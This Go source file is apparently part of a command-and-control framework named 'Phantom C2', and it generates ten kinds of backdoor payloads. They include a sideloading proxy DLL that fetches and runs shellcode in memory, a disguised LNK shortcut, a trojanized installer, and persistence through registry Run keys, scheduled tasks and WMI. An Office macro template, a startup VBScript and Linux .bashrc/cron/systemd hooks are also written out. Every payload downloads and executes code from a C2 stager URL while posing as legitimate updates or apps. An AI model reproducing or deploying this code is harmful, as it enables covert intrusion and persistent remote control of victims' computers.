package payloads

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// BackdoorType identifies the backdoor technique.
type BackdoorType string

const (
	BackdoorDLLSideload  BackdoorType = "dll-sideload"
	BackdoorLNK          BackdoorType = "lnk"
	BackdoorInstallerWrap BackdoorType = "installer"
	BackdoorServiceDLL   BackdoorType = "service-dll"
	BackdoorRegistryRun  BackdoorType = "registry"
	BackdoorScheduledTask BackdoorType = "schtask"
	BackdoorWMIEvent     BackdoorType = "wmi"
	BackdoorOfficeTemplate BackdoorType = "office-template"
	BackdoorStartupFolder BackdoorType = "startup"
	BackdoorBashRC       BackdoorType = "bashrc"
)

// BackdoorConfig holds configuration for backdoor generation.
type BackdoorConfig struct {
	Type        BackdoorType
	ListenerURL string
	AgentPath   string // Path to compiled agent binary
	TargetApp   string // Legitimate app to trojanize (for installer/sideload)
	OutputDir   string
}

// GenerateBackdoor creates a backdoor payload based on the config.
func GenerateBackdoor(cfg BackdoorConfig) (string, error) {
	os.MkdirAll(cfg.OutputDir, 0755)

	switch cfg.Type {
	case BackdoorDLLSideload:
		return generateDLLSideload(cfg)
	case BackdoorLNK:
		return generateLNKBackdoor(cfg)
	case BackdoorInstallerWrap:
		return generateInstallerWrapper(cfg)
	case BackdoorServiceDLL:
		return generateServiceDLL(cfg)
	case BackdoorRegistryRun:
		return generateRegistryPersistence(cfg)
	case BackdoorScheduledTask:
		return generateScheduledTask(cfg)
	case BackdoorWMIEvent:
		return generateWMIEvent(cfg)
	case BackdoorOfficeTemplate:
		return generateOfficeTemplate(cfg)
	case BackdoorStartupFolder:
		return generateStartupFolder(cfg)
	case BackdoorBashRC:
		return generateBashRCBackdoor(cfg)
	default:
		return "", fmt.Errorf("unknown backdoor type: %s", cfg.Type)
	}
}

// ══════════════════════════════════════════
//  DLL SIDELOADING
// ══════════════════════════════════════════

// Generates a C source DLL that loads the agent when a legitimate
// application loads it via DLL search order hijacking.
// Common targets: Teams (CRYPTSP.dll), Slack (chrome_elf.dll),
// OneDrive (secur32.dll), Notepad++ (SciLexer.dll)
func generateDLLSideload(cfg BackdoorConfig) (string, error) {
	dllName := "version.dll" // Default — nearly every app loads this
	if cfg.TargetApp != "" {
		// Map common apps to their vulnerable DLL names
		appDLLs := map[string]string{
			"teams":     "CRYPTSP.dll",
			"slack":     "chrome_elf.dll",
			"onedrive":  "secur32.dll",
			"notepad++": "SciLexer.dll",
			"vscode":    "WINMM.dll",
			"chrome":    "chrome_elf.dll",
			"firefox":   "mozglue.dll",
			"putty":     "WINMM.dll",
			"7zip":      "7-zip.dll",
			"vlc":       "libvlc.dll",
		}
		if dll, ok := appDLLs[strings.ToLower(cfg.TargetApp)]; ok {
			dllName = dll
		}
	}

	// Generate C source for proxy DLL
	source := fmt.Sprintf(`// Phantom C2 — DLL Sideloading Payload
// Target DLL: %s
// Compile: x86_64-w64-mingw32-gcc -shared -o %s sideload.c -lwininet
// Place alongside the legitimate application

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW")

#define C2_URL "%s"

DWORD WINAPI AgentThread(LPVOID lpParam) {
    // Download and execute agent in memory
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, C2_URL "/api/v1/stager", NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return 1; }

    char buffer[4096];
    DWORD bytesRead;
    LPVOID payload = VirtualAlloc(NULL, 1024*1024, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD totalRead = 0;

    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        memcpy((char*)payload + totalRead, buffer, bytesRead);
        totalRead += bytesRead;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (totalRead > 0) {
        ((void(*)())payload)();
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
    }
    return TRUE;
}
`, dllName, dllName, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "sideload.c")
	if err := os.WriteFile(outPath, []byte(source), 0644); err != nil {
		return "", err
	}

	// Also generate build script
	buildScript := fmt.Sprintf(`@echo off
REM Compile DLL sideload payload
REM Requires: MinGW-w64 (x86_64-w64-mingw32-gcc)

x86_64-w64-mingw32-gcc -shared -o %s sideload.c -lwininet -s
echo [+] DLL built: %s
echo [*] Place this DLL alongside the target application
echo [*] When the app loads, it will silently execute the Phantom agent
`, dllName, dllName)

	buildPath := filepath.Join(cfg.OutputDir, "build.bat")
	os.WriteFile(buildPath, []byte(buildScript), 0644)

	readmePath := filepath.Join(cfg.OutputDir, "README.txt")
	readme := fmt.Sprintf(`DLL Sideloading Backdoor
=======================
Target DLL: %s
Target App: %s
C2 URL: %s

Usage:
1. Compile: x86_64-w64-mingw32-gcc -shared -o %s sideload.c -lwininet -s
2. Place %s in the same directory as the target application
3. When the user launches the app, the DLL loads and executes the agent
4. The legitimate app continues to work normally

The DLL proxies all exports to the real system DLL, so the app
functions normally while the agent runs in a background thread.
`, dllName, cfg.TargetApp, cfg.ListenerURL, dllName, dllName)
	os.WriteFile(readmePath, []byte(readme), 0644)

	return outPath, nil
}

// ══════════════════════════════════════════
//  LNK (SHORTCUT) BACKDOOR
// ══════════════════════════════════════════

// Generates a PowerShell script that creates a malicious .lnk file.
// The shortcut looks like a legitimate app but runs the agent in the background.
func generateLNKBackdoor(cfg BackdoorConfig) (string, error) {
	targetApp := cfg.TargetApp
	if targetApp == "" {
		targetApp = "notepad.exe"
	}

	// PowerShell to create the LNK
	ps := fmt.Sprintf(`# Phantom C2 — LNK Backdoor Generator
# Creates a shortcut that runs the agent + opens the legitimate app

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\%s.lnk")

# The shortcut runs PowerShell hidden, which:
# 1. Downloads and runs the Phantom agent in background
# 2. Launches the legitimate application
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = '/c start /b powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''%s/api/v1/stager'')" & start %s'
$Shortcut.IconLocation = "C:\Windows\System32\%s,0"
$Shortcut.WindowStyle = 7  # Minimized
$Shortcut.Save()

Write-Host "[+] LNK backdoor created: $env:USERPROFILE\Desktop\%s.lnk"
Write-Host "[*] Icon matches %s — user sees a normal shortcut"
Write-Host "[*] When clicked: agent runs silently + %s opens normally"
`, targetApp, cfg.ListenerURL, targetApp, targetApp, targetApp, targetApp, targetApp)

	outPath := filepath.Join(cfg.OutputDir, "create_lnk.ps1")
	return outPath, os.WriteFile(outPath, []byte(ps), 0644)
}

// ══════════════════════════════════════════
//  INSTALLER WRAPPER
// ══════════════════════════════════════════

// Wraps a legitimate installer with the Phantom agent.
// The wrapper runs both: the real installer (visible to user)
// and the agent (hidden in background).
func generateInstallerWrapper(cfg BackdoorConfig) (string, error) {
	// C# source for installer wrapper
	source := fmt.Sprintf(`// Phantom C2 — Installer Wrapper
// Compile: csc /target:winexe /out:Setup.exe wrapper.cs
// Embed: ILMerge or self-extracting archive

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

class Program {
    static void Main(string[] args) {
        // 1. Run agent in background thread
        new Thread(() => {
            try {
                string agentPath = Path.Combine(Path.GetTempPath(), "svchost_update.exe");
                using (WebClient wc = new WebClient()) {
                    wc.DownloadFile("%s/api/v1/stager", agentPath);
                }
                ProcessStartInfo psi = new ProcessStartInfo(agentPath) {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            } catch {}
        }).Start();

        // 2. Extract and run the real installer
        string realInstaller = ExtractEmbeddedResource("installer.exe");
        if (File.Exists(realInstaller)) {
            Process.Start(realInstaller)?.WaitForExit();
            File.Delete(realInstaller);
        }
    }

    static string ExtractEmbeddedResource(string name) {
        string path = Path.Combine(Path.GetTempPath(), name);
        // In production, extract from embedded resource
        // For now, look for installer.exe in same directory
        string source = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, name);
        if (File.Exists(source)) File.Copy(source, path, true);
        return path;
    }
}
`, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "wrapper.cs")
	if err := os.WriteFile(outPath, []byte(source), 0644); err != nil {
		return "", err
	}

	// Build instructions
	readme := fmt.Sprintf(`Installer Wrapper Backdoor
=========================
C2 URL: %s

Usage:
1. Place the legitimate installer as "installer.exe" in the same directory
2. Compile: csc /target:winexe /out:Setup.exe wrapper.cs
3. Distribute Setup.exe to the target
4. When run: agent downloads silently + real installer launches normally
5. User sees the normal installation wizard, agent runs in background

For a more polished approach, use ILMerge to embed the real installer
as a resource, or create a self-extracting archive with 7-Zip SFX.
`, cfg.ListenerURL)
	os.WriteFile(filepath.Join(cfg.OutputDir, "README.txt"), []byte(readme), 0644)

	return outPath, nil
}

// ══════════════════════════════════════════
//  WINDOWS SERVICE DLL
// ══════════════════════════════════════════

// Generates a DLL that runs as a Windows service.
// Install: sc create PhantomSvc binPath= "svchost.exe -k netsvcs" type= own
func generateServiceDLL(cfg BackdoorConfig) (string, error) {
	source := fmt.Sprintf(`// Phantom C2 — Service DLL Backdoor
// Compile: x86_64-w64-mingw32-gcc -shared -o svc.dll service_dll.c -lwininet -s
// Install: copy to C:\Windows\System32\, register as service

#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

#define C2_URL "%s"

SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
SERVICE_STATUS g_ServiceStatus = {0};

DWORD WINAPI AgentThread(LPVOID lpParam) {
    while (1) {
        HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hNet) {
            HINTERNET hUrl = InternetOpenUrlA(hNet, C2_URL "/api/v1/stager", NULL, 0,
                INTERNET_FLAG_RELOAD, 0);
            if (hUrl) {
                char buf[4096]; DWORD br;
                LPVOID mem = VirtualAlloc(NULL, 1024*1024, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                DWORD total = 0;
                while (InternetReadFile(hUrl, buf, sizeof(buf), &br) && br > 0) {
                    memcpy((char*)mem + total, buf, br);
                    total += br;
                }
                if (total > 0) ((void(*)())mem)();
                InternetCloseHandle(hUrl);
            }
            InternetCloseHandle(hNet);
        }
        Sleep(60000); // Retry every 60 seconds
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA("PhantomSvc", NULL);
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    AgentThread(NULL);
}

__declspec(dllexport) void ServiceMain_Export(DWORD argc, LPSTR *argv) { ServiceMain(argc, argv); }

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
    return TRUE;
}
`, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "service_dll.c")
	return outPath, os.WriteFile(outPath, []byte(source), 0644)
}

// ══════════════════════════════════════════
//  REGISTRY RUN KEY PERSISTENCE
// ══════════════════════════════════════════

func generateRegistryPersistence(cfg BackdoorConfig) (string, error) {
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(
		"IEX(New-Object Net.WebClient).DownloadString('%s/api/v1/stager')", cfg.ListenerURL)))

	ps := fmt.Sprintf(`# Phantom C2 — Registry Run Key Persistence
# Adds a hidden PowerShell stager to HKCU\Software\Microsoft\Windows\CurrentVersion\Run

$cmd = "powershell.exe -w hidden -ep bypass -enc %s"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Method 1: Current User (no admin required)
Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value $cmd
Write-Host "[+] Registry Run key set (HKCU)"

# Method 2: All Users (requires admin)
# Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -Value $cmd

# Method 3: WinLogon (runs at login, requires admin)
# Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\System32\userinit.exe,$cmd"

Write-Host "[*] Agent will execute on every login"
Write-Host "[*] To remove: Remove-ItemProperty -Path '%s' -Name 'WindowsSecurityUpdate'"
`, b64Cmd, "$regPath")

	outPath := filepath.Join(cfg.OutputDir, "registry_persist.ps1")
	return outPath, os.WriteFile(outPath, []byte(ps), 0644)
}

// ══════════════════════════════════════════
//  SCHEDULED TASK
// ══════════════════════════════════════════

func generateScheduledTask(cfg BackdoorConfig) (string, error) {
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(
		"IEX(New-Object Net.WebClient).DownloadString('%s/api/v1/stager')", cfg.ListenerURL)))

	ps := fmt.Sprintf(`# Phantom C2 — Scheduled Task Persistence

# Create a scheduled task that runs every 15 minutes
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -ep bypass -enc %s"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force

Write-Host "[+] Scheduled task created: MicrosoftEdgeUpdate"
Write-Host "[*] Runs every 15 minutes as current user"
Write-Host "[*] To remove: Unregister-ScheduledTask -TaskName 'MicrosoftEdgeUpdate' -Confirm:$false"
`, b64Cmd)

	outPath := filepath.Join(cfg.OutputDir, "schtask_persist.ps1")
	return outPath, os.WriteFile(outPath, []byte(ps), 0644)
}

// ══════════════════════════════════════════
//  WMI EVENT SUBSCRIPTION
// ══════════════════════════════════════════

func generateWMIEvent(cfg BackdoorConfig) (string, error) {
	ps := fmt.Sprintf(`# Phantom C2 — WMI Event Subscription Persistence
# Fileless persistence — survives reboots, no files on disk
# Requires: Administrator privileges

$FilterName = "WindowsUpdateCheck"
$ConsumerName = "WindowsUpdateRunner"

# Trigger: every time the system has been running for 5+ minutes after boot
$WMIQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"

# Payload: download and execute stager
$Command = "powershell.exe -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('%s/api/v1/stager')"

# Create WMI filter
$FilterArgs = @{
    Name = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $WMIQuery
}
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $FilterArgs

# Create WMI consumer
$ConsumerArgs = @{
    Name = $ConsumerName
    CommandLineTemplate = $Command
}
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments $ConsumerArgs

# Bind filter to consumer
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $BindingArgs

Write-Host "[+] WMI event subscription created (fileless persistence)"
Write-Host "[*] Agent executes ~5 minutes after every boot"
Write-Host "[*] No files on disk — entirely in WMI repository"
Write-Host "[*] To remove:"
Write-Host "    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where Name -eq '$FilterName' | Remove-WmiObject"
Write-Host "    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where Name -eq '$ConsumerName' | Remove-WmiObject"
Write-Host "    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject"
`, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "wmi_persist.ps1")
	return outPath, os.WriteFile(outPath, []byte(ps), 0644)
}

// ══════════════════════════════════════════
//  OFFICE TEMPLATE INJECTION
// ══════════════════════════════════════════

func generateOfficeTemplate(cfg BackdoorConfig) (string, error) {
	b64Cmd := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(
		"IEX(New-Object Net.WebClient).DownloadString('%s/api/v1/stager')", cfg.ListenerURL)))

	// Generate a macro-enabled template
	vba := fmt.Sprintf(`' Phantom C2 — Office Template Backdoor
' Save as .dotm (Word) or .xltm (Excel) in the Templates folder
' Every new document created from this template runs the agent

Private Sub Document_Open()
    RunAgent
End Sub

Private Sub AutoOpen()
    RunAgent
End Sub

Private Sub Workbook_Open()
    RunAgent
End Sub

Private Sub RunAgent()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")

    ' Method 1: PowerShell encoded command
    objShell.Run "powershell.exe -w hidden -ep bypass -enc %s", 0, False

    Set objShell = Nothing
End Sub
`, b64Cmd)

	outPath := filepath.Join(cfg.OutputDir, "template_macro.vba")
	if err := os.WriteFile(outPath, []byte(vba), 0644); err != nil {
		return "", err
	}

	readme := fmt.Sprintf(`Office Template Backdoor
========================
C2 URL: %s

Installation (Word):
1. Open Word → File → Options → Advanced → File Locations → User Templates
2. Note the templates path (usually: %%APPDATA%%\Microsoft\Templates)
3. Save the macro as Normal.dotm in that folder
4. Every new Word document will trigger the agent

Installation (Excel):
1. Save as Personal.xlsb in %%APPDATA%%\Microsoft\Excel\XLSTART\
2. Every Excel session loads this workbook silently

The macro runs silently — no visible window, no prompt.
`, cfg.ListenerURL)
	os.WriteFile(filepath.Join(cfg.OutputDir, "README.txt"), []byte(readme), 0644)

	return outPath, nil
}

// ══════════════════════════════════════════
//  STARTUP FOLDER
// ══════════════════════════════════════════

func generateStartupFolder(cfg BackdoorConfig) (string, error) {
	// VBScript that runs at startup (placed in Startup folder)
	vbs := fmt.Sprintf(`' Phantom C2 — Startup Folder Backdoor
' Copy to: %%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\
' Runs silently on every login

Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Download agent
agentPath = objShell.ExpandEnvironmentStrings("%%TEMP%%") & "\svchost_update.exe"

On Error Resume Next
objHTTP.Open "GET", "%s/api/v1/stager", False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile agentPath, 2
    objStream.Close

    objShell.Run agentPath, 0, False
End If

Set objHTTP = Nothing
Set objShell = Nothing
`, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "WindowsUpdate.vbs")
	return outPath, os.WriteFile(outPath, []byte(vbs), 0644)
}

// ══════════════════════════════════════════
//  LINUX BASHRC BACKDOOR
// ══════════════════════════════════════════

func generateBashRCBackdoor(cfg BackdoorConfig) (string, error) {
	script := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — Bash RC Backdoor
# Appends a hidden callback to the user's .bashrc
# Agent runs in background every time a terminal is opened

PAYLOAD='(curl -s %s/api/v1/stager -o /tmp/.cache_update && chmod +x /tmp/.cache_update && /tmp/.cache_update &) 2>/dev/null'

# Method 1: .bashrc (every interactive shell)
echo "" >> ~/.bashrc
echo "# system update check" >> ~/.bashrc
echo "$PAYLOAD" >> ~/.bashrc

# Method 2: .profile (login shells)
echo "" >> ~/.profile
echo "$PAYLOAD" >> ~/.profile

# Method 3: Cron job (every 15 minutes)
(crontab -l 2>/dev/null; echo "*/15 * * * * $PAYLOAD") | crontab -

# Method 4: Systemd user service (persistent daemon)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/update-checker.service << 'UNIT'
[Unit]
Description=System Update Checker

[Service]
ExecStart=/bin/bash -c 'curl -s %s/api/v1/stager -o /tmp/.cache_update && chmod +x /tmp/.cache_update && /tmp/.cache_update'
Restart=always
RestartSec=900

[Install]
WantedBy=default.target
UNIT

systemctl --user enable update-checker.service 2>/dev/null
systemctl --user start update-checker.service 2>/dev/null

echo "[+] Backdoor installed via: .bashrc, .profile, cron, systemd"
echo "[*] Agent will persist across reboots and new sessions"
`, cfg.ListenerURL, cfg.ListenerURL)

	outPath := filepath.Join(cfg.OutputDir, "linux_backdoor.sh")
	return outPath, os.WriteFile(outPath, []byte(script), 0755)
}

// ListBackdoorTypes returns all available backdoor types with descriptions.
func ListBackdoorTypes() []struct{ Type, Name, Platform, Description string } {
	return []struct{ Type, Name, Platform, Description string }{
		{"dll-sideload", "DLL Sideloading", "Windows", "Proxy DLL loaded by legitimate apps (Teams, Slack, Chrome, etc.)"},
		{"lnk", "LNK Shortcut", "Windows", "Malicious shortcut that runs agent + opens real app"},
		{"installer", "Installer Wrapper", "Windows", "Trojanized installer — runs agent + real setup wizard"},
		{"service-dll", "Service DLL", "Windows", "DLL that runs as a Windows service (svchost)"},
		{"registry", "Registry Run Key", "Windows", "HKCU/HKLM Run key persistence (survives reboot)"},
		{"schtask", "Scheduled Task", "Windows", "Hidden scheduled task running every 15 minutes"},
		{"wmi", "WMI Event", "Windows", "Fileless WMI event subscription (no files on disk)"},
		{"office-template", "Office Template", "Windows", "Macro in Word/Excel template (runs on every new doc)"},
		{"startup", "Startup Folder", "Windows", "VBScript in Startup folder (runs on login)"},
		{"bashrc", "Bash RC", "Linux", "Backdoor via .bashrc, .profile, cron, and systemd"},
	}
}
